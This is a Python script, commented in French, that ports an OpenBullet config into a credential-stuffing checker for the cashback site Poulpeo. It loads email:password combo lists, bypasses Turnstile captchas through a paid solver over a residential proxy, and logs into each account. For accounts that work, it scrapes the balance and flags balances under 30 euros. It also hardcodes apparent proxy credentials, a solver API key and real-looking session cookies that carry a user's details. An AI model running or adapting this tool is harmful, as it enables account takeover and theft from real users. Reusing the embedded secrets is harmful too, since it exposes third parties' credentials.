#!/usr/bin/env python3
"""
Automatisation du flux config OpenBullet → Python.
Le proxy est utilisé uniquement pour les appels solver ; les requêtes vers localhost ne passent pas par le proxy.
"""

from __future__ import annotations

import json
import sys
import time
import urllib.parse
from pathlib import Path
from typing import Any

import requests

# --- Constantes (équivalent VAR "p" / VAR "k") ---
PROXY = "http://793340c81e043f1cd261:355c039eab316282@gw.dataimpulse.com:823"
SOLVER_KEY = "NHpps0GHnBe0v7MmFim6INi990j1drzhv49EUko3t0q8FStXRboY3ctdyU6i85TX"

LOCAL_BASE = "http://localhost:5000"
SOLVER_CREATE = "https://solver.solverify.net/createTask"
SOLVER_RESULT = "https://solver.solverify.net/getTaskResult"

SOLVER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
    ),
    "Pragma": "no-cache",
    "Accept": "*/*",
}

# Valeur opendata déjà encodée (telle que dans la config d’origine)
OPENDATA_ENCODED = (
    "%7B%22od_tmd%22%3A0%2C%22od_cid%22%3A%22olm4f8be2f5359557.71533147%22%2C"
    "%22od_srv%22%3A%22deploy-poulpeo-kraken-774499dd9c-wxqbn%22%2C%22od_mid%22"
    "%3A%22%22%2C%22od_mnm%22%3A%22%22%2C%22od_catid%22%3A%22%22%2C%22od_catnm"
    "%22%3A%22%22%2C%22od_oid%22%3A%22%22%2C%22od_onm%22%3A%22%22%2C%22od_ctx"
    "%22%3A%22cashback_not_logged%22%2C%22od_scrsz%22%3A%221080x1920%22%2C%22"
    "od_v%22%3A%2224.2.1%22%2C%22od_fp%22%3A%22aec60dc6-6a2b-4fa4-8179-e08e2991"
    "a9c1%22%2C%22od_vpt%22%3A%22desktop%22%2C%22od_act%22%3A%22%22%2C%22od_uid"
    "%22%3A%22%22%2C%22od_tag%22%3A%22PLP%22%2C%22od_gg_utmz%22%3A%22243927300."
    "1770297921.1.1.utmcsr%3Dadwords%7Cutmgclid%3DCj0KCQiAnJHMBhDAARIsABr7b84"
    "bBprfPSy3ru3F6NHrwe2jVCVJnPFuxyccHnIQNugPik-tMMgkyWYaAmDoEALw_wcB%7Cut"
    "mccn%3DBRND-Poulpeo-BRND-0-G-GS%7Cutmcmd%3Dcpc%7Cutmctr%3DPLP-Poulpeo-0-"
    "EXC%22%2C%22od_gg_utmcsr%22%3A%22adwords%22%2C%22od_gg_utmccn%22%3A%22BRND"
    "-Poulpeo-BRND-0-G-GS%22%2C%22od_gg_utmcmd%22%3A%22cpc%22%2C%22od_gg_utmctr"
    "%22%3A%22PLP-Poulpeo-0-EXC%22%2C%22od_gg_utmcct%22%3A%22%22%2C%22od_gg_utma"
    "%22%3A%22243927300.669169642.1770297921.1770570708.1771120626.3%22%2C%22od_"
    "gg_utm_visit%22%3A%22669169642%22%2C%22od_gg_utm_session%22%3A%221771120626"
    "%22%2C%22od_ip%22%3A%22251.162.204.154%22%2C%22od_oref%22%3A%22https%3A%2F"
    "%2Fwww.google.com%2F%22%2C%22od_olpg%22%3A%22https%3A%2F%2Fwww.poulpeo.com"
    "%2F%3Futm_source%3Dadwords%26utm_medium%3Dcpc%26utm_term%3DPLP-Poulpeo-0-"
    "EXC%26utm_campaign%3DBRND-Poulpeo-BRND-0-G-GS%26gad_source%3D1%26gad_campa"
    "ignid%3D266528653%26gbraid%3D0AAAAADwe5zOah_MXLwl8yqUxYCo4T3e8T%26gclid%3D"
    "Cj0KCQiAnJHMBhDAARIsABr7b84bBprfPSy3ru3F6NHrwe2jVCVJnPFuxyccHnIQNugPik"
    "-tMMgkyWYaAmDoEALw_wcB%22%2C%22od_lpg%22%3A%22%22%2C%22od_sref%22%3A%22"
    "https%3A%2F%2Fwww.poulpeo.com%2Fconnexion%22%2C%22od_cpgt%22%3A%22%22%2C"
    "%22od_cpgid%22%3A%22%22%7D"
)

# Cookies initiaux (remplir si votre middleware localhost les exige)
COOKIE_REFERER_URL = ""
COOKIE_XSRF = ""
COOKIE_KRAKEN_SESSION = ""
COOKIE_MEMBER_PROFILE = ""

GET_COOKIE_TEMPLATE = (
    "kraken_poulpeo_session=sjGAnqHb6CrsfgYi7oa7brFiHCceiNGgK9N9xpbC; "
    "assets=[%22e418cf00%22]; "
    "PHPSESSID=0vqhosa0uje7ciemur5ovnedlj; "
    "ssck=eyJpZF91c2VyIjoiMjE4Nzc4MCIsImkxOG4iOiJmcl9GUiIsImxvZ2luIjoib3BpZWNvbmVtIiwiZ3JhZGVfc2x1ZyI6ImRlZmF1bHQiLCJ1c2VyX3JvbGUiOiIxIiwidG90YWxfZWFybmluZ3MiOiI2LjY3IiwiZGF0ZV9hZGQiOiIxNTYzNTU5MjkwIiwibmJfY2FzaGJhY2siOiI2OSIsInN0ayI6ImQ3NTZkZjFlNGI0MWNkNDEyNjBkNmE3NTk1OGYzOWMzZWNiZDQ2YmIifQ%3D%3D; "
    "token={token}; "
    "original_referer=%22https%3A%5C%2F%5C%2Fwww.poulpeo.com%5C%2Fconnexion%22; "
    "session_referer=%22https%3A%5C%2F%5C%2Fwww.poulpeo.com%5C%2Fconnexion%22; "
    "zdbot=1; "
    "clickpage=https://www.poulpeo.com/compte.htm; "
    "_ga_MM131BBJYY=GS1.1.1725301696.1.1.1725301707.0.0.0; "
    "ABTastySession=mrasn=&lp=https%253A%252F%252Fwww.poulpeo.com%252F; "
    "__rmnz=utmccn=(direct)|utmcsr=(direct)|utmcmd=(none)|utmpvid=66d603cb47328; "
    "ABTasty=uid=s6ys5jzyrygjm4gv&fst=1725301694883&pst=-1&cst=1725301694883&ns=1&pvt=2&pvis=2&th=942555.1174600.1.1.1.1.1725301707247.1725301707247.1.1"
)

POLL_INTERVAL_SEC = 3.0
POLL_MAX_ATTEMPTS = 80

# 0 = afficher la SOURCE complète ; sinon tronquer (octets affichés)
SOURCE_PREVIEW_MAX = 12000

# Timeouts requests : (connexion TCP/proxy, lecture). Évite un blocage silencieux si le proxy ne répond pas.
TIMEOUT_CONNECT_SEC = 25
TIMEOUT_READ_SEC = 120
REQUEST_TIMEOUT = (TIMEOUT_CONNECT_SEC, TIMEOUT_READ_SEC)


def log(msg: str) -> None:
    """Affichage immédiat (important sous Windows cmd si le script semble « figé »)."""
    print(msg, flush=True)


def proxy_dict(url: str) -> dict[str, str]:
    return {"http": url, "https": url}


def lr_parse(text: str, left: str, right: str) -> str | None:
    i = text.find(left)
    if i == -1:
        return None
    i += len(left)
    j = text.find(right, i)
    if j == -1:
        return None
    return text[i:j]


def parse_float_fr(s: str) -> float | None:
    s = s.strip().replace("\xa0", "").replace(" ", "").replace(",", ".")
    try:
        return float(s)
    except ValueError:
        return None


def read_combos(path: Path) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    raw = path.read_text(encoding="utf-8", errors="replace").splitlines()
    for line in raw:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            continue
        email, pw = line.split(":", 1)
        email, pw = email.strip(), pw.strip()
        if email and pw:
            out.append((email, pw))
    return out


def create_turnstile_task(sess: requests.Session) -> tuple[str | None, str, int]:
    payload: dict[str, Any] = {
        "clientKey": SOLVER_KEY,
        "task": {
            "type": "turnstile",
            "websiteURL": "https://api.poulpeo.com/1.0/web/auth/login",
            "websiteKey": "0x4AAAAAAAgHjuh-ZRIj6Q7d",
            "cdata": "example_cdata",
            "action": "login",
        },
    }
    r = sess.post(
        SOLVER_CREATE,
        headers={**SOLVER_HEADERS, "Content-Type": "application/json"},
        data=json.dumps(payload),
        timeout=REQUEST_TIMEOUT,
    )
    src = r.text
    code = r.status_code
    if not r.ok:
        return None, src, code
    try:
        data = r.json()
        tid = data.get("taskId")
        if tid:
            return str(tid), src, code
        return None, src, code
    except json.JSONDecodeError:
        return None, src, code


def poll_task_result(
    sess: requests.Session,
    task_id: str,
    *,
    progress_label: str = "",
) -> tuple[str | None, str, int]:
    payload = {"clientKey": SOLVER_KEY, "taskId": task_id}
    body = json.dumps(payload)
    last_text = ""
    last_code = 0
    for attempt in range(POLL_MAX_ATTEMPTS):
        if attempt == 0 or (attempt + 1) % 5 == 0 or attempt == POLL_MAX_ATTEMPTS - 1:
            prefix = f"{progress_label} " if progress_label else ""
            log(f"{prefix}getTaskResult essai {attempt + 1}/{POLL_MAX_ATTEMPTS} …")
        r = sess.post(
            SOLVER_RESULT,
            headers={
                **SOLVER_HEADERS,
                "Content-Type": "application/x-www-form-urlencoded",
            },
            data=body,
            timeout=REQUEST_TIMEOUT,
        )
        last_text = r.text
        last_code = r.status_code
        if "processing" in last_text.lower():
            time.sleep(POLL_INTERVAL_SEC)
            continue
        try:
            data = r.json()
            val = data.get("value") or data.get("solution", {}).get("token")
            if val:
                return str(val), last_text, last_code
        except json.JSONDecodeError:
            pass
        time.sleep(POLL_INTERVAL_SEC)
    return None, last_text, last_code


def login_headers(proxy_url: str) -> dict[str, str]:
    return {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "api.poulpeo.com",
        "Origin": "https://www.poulpeo.com",
        "Referer": "https://www.poulpeo.com/connexion",
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
        ),
        "X-CLIENT-ID": "als62fcbccd5ebee0.86680096",
        "X-EXEC-ENV": "Auth Funnel / prod",
        "postUrl": "https://api.poulpeo.com/1.0/web/auth/login",
        "postProxy": proxy_url,
    }


def build_login_cookie() -> str:
    parts = [
        f"referer_url:{COOKIE_REFERER_URL or ''}",
        f"XSRF-TOKEN:{COOKIE_XSRF or ''}",
        f"kraken_poulpeo_session:{COOKIE_KRAKEN_SESSION or ''}",
        f"memberProfile:{COOKIE_MEMBER_PROFILE or ''}",
    ]
    return "; ".join(parts)


def post_login(
    sess: requests.Session,
    email: str,
    password: str,
    captcha_token: str,
    proxy_url: str,
) -> requests.Response:
    us = urllib.parse.quote(email, safe="")
    body = (
        f"captchaToken={urllib.parse.quote(captcha_token)}"
        f"&email={us}"
        f"&password={urllib.parse.quote(password)}"
        f"&opendata={OPENDATA_ENCODED}"
    )
    headers = login_headers(proxy_url)
    headers["Cookie"] = build_login_cookie()
    return sess.post(
        LOCAL_BASE,
        data=body.encode("utf-8"),
        headers=headers,
        timeout=REQUEST_TIMEOUT,
    )


def is_login_success(text: str, status_code: int) -> bool:
    if status_code == 401:
        return False
    if "token\":\"ey" in text or 'token":"ey' in text:
        return True
    if "Acc\\u00e8s \\u00e0 cette ressource refus\\u00e9" in text:
        return False
    if "Accès à cette ressource refusé" in text:
        return False
    return False


def extract_session_token(text: str) -> str | None:
    return lr_parse(text, '{"token":"', '",' )


def get_balance_page(sess: requests.Session, token: str, proxy_url: str) -> tuple[str, int]:
    cookie = GET_COOKIE_TEMPLATE.format(token=token)
    headers = {
        "accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        ),
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0",
        "priority": "u=0, i",
        "referer": "https://www.poulpeo.com/inscription",
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        ),
        "postUrl": "https://www.poulpeo.com/compte.htm",
        "postProxy": proxy_url,
        "Cookie": cookie,
    }
    r = sess.get(LOCAL_BASE, headers=headers, timeout=REQUEST_TIMEOUT)
    return r.text, r.status_code


def extract_balance(html: str) -> float | None:
    chunk = lr_parse(html, '<span class="amount">', '<sup>€</sup></span>')
    if chunk is None:
        return None
    return parse_float_fr(chunk)


def print_source(label: str, text: str, status_code: int | None = None) -> None:
    """Affiche la réponse brute (équivalent <SOURCE> OpenBullet)."""
    head = f"--- SOURCE {label}"
    if status_code is not None:
        head += f" [HTTP {status_code}]"
    head += " ---"
    log(head)
    if SOURCE_PREVIEW_MAX and len(text) > SOURCE_PREVIEW_MAX:
        log(text[:SOURCE_PREVIEW_MAX])
        log(
            f"... [tronqué — {len(text)} octets au total, SOURCE_PREVIEW_MAX={SOURCE_PREVIEW_MAX}]"
        )
    else:
        log(text)
    log("--- fin SOURCE ---\n")


def fmt_rates(
    processed: int,
    valid: int,
    invalid: int,
    custom_low: int,
    elapsed_min: float,
) -> str:
    cpm_total = processed / elapsed_min
    cpm_valid = valid / elapsed_min
    cpm_invalid = invalid / elapsed_min
    return (
        f"valid={valid} invalid={invalid} custom<{30}={custom_low} "
        f"CPM={cpm_total:.1f} CPM_valid={cpm_valid:.1f} CPM_invalid={cpm_invalid:.1f}"
    )


def main() -> int:
    fichier = input("Chemin du fichier mail:pass : ").strip().strip('"').strip("'")
    path = Path(fichier).expanduser()
    if not path.is_file():
        print(f"Fichier introuvable : {path}", file=sys.stderr)
        return 1

    combos = read_combos(path)
    if not combos:
        print("Aucun combo valide.", file=sys.stderr)
        return 1

    proxy_url = PROXY
    proxies = proxy_dict(proxy_url)

    valid = 0
    invalid = 0
    custom_low = 0
    t0 = time.monotonic()
    processed = 0

    solver_sess = requests.Session()
    solver_sess.proxies.update(proxies)

    local_sess = requests.Session()
    local_sess.trust_env = False

    n_total = len(combos)
    log(f"{n_total} ligne(s) à traiter.")
    log(
        f"Démarrage combo 1/{n_total} : étape solver (proxy → {SOLVER_CREATE.split('/')[2]}), "
        f"timeouts connexion={TIMEOUT_CONNECT_SEC}s lecture={TIMEOUT_READ_SEC}s."
    )
    log("(Si rien ne bouge plus de ~30s, vérifie le proxy / pare-feu / crédits DataImpulse.)\n")

    for email, password in combos:
        processed += 1

        log(f"[{processed}/{n_total}] {email} — createTask (solver via proxy)…")
        try:
            task_id, src_create, code_create = create_turnstile_task(solver_sess)
        except requests.RequestException as e:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID (solver createTask réseau: {e!s}) | {rates}")
            continue

        if not task_id:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID (solver createTask) | {rates}")
            print_source("solver createTask", src_create, code_create)
            continue

        log(f"[{processed}/{n_total}] {email} — attente résolution captcha (getTaskResult)…")
        try:
            tk, src_poll, code_poll = poll_task_result(
                solver_sess,
                task_id,
                progress_label=f"[{processed}/{n_total}]",
            )
        except requests.RequestException as e:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID (solver getTaskResult réseau: {e!s}) | {rates}")
            continue

        if not tk:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID (solver timeout / pas de token) | {rates}")
            print_source("solver getTaskResult (dernière réponse)", src_poll, code_poll)
            continue

        log(f"[{processed}/{n_total}] {email} — login via {LOCAL_BASE} …")
        try:
            login_resp = post_login(local_sess, email, password, tk, proxy_url)
        except requests.RequestException as e:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID (login req {e!s}) | {rates}")
            continue

        body = login_resp.text
        ok = is_login_success(body, login_resp.status_code)

        if not ok:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID {email!s} | {rates}")
            print_source("login POST", body, login_resp.status_code)
            continue

        token = extract_session_token(body)
        if not token:
            invalid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] INVALID (pas de token) {email!s} | {rates}")
            print_source("login POST", body, login_resp.status_code)
            continue

        print_source("login POST", body, login_resp.status_code)

        log(f"[{processed}/{n_total}] {email} — récupération page solde…")
        try:
            html, bal_code = get_balance_page(local_sess, token, proxy_url)
        except requests.RequestException as e:
            valid += 1
            elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
            rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
            log(f"[{processed}] VALID {email!s} (solde: erreur requête {e!s}) | {rates}")
            continue

        print_source("GET compte.htm (solde)", html, bal_code)

        solde = extract_balance(html)
        if solde is not None and solde < 30:
            custom_low += 1

        valid += 1
        elapsed_min = max((time.monotonic() - t0) / 60.0, 1e-6)
        rates = fmt_rates(processed, valid, invalid, custom_low, elapsed_min)
        solde_s = f"{solde}" if solde is not None else "?"
        flag = " [CUSTOM solde<30]" if solde is not None and solde < 30 else ""
        log(f"[{processed}] VALID {email!s} solde={solde_s}{flag} | {rates}")

    elapsed = time.monotonic() - t0
    em = max(elapsed / 60.0, 1e-6)
    cpm_total = processed / em
    cpm_valid = valid / em
    cpm_invalid = invalid / em
    log(
        f"\nTerminé en {elapsed:.1f}s — valid={valid} invalid={invalid} "
        f"custom_solde<30={custom_low} "
        f"CPM≈{cpm_total:.1f} CPM_valid≈{cpm_valid:.1f} CPM_invalid≈{cpm_invalid:.1f}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
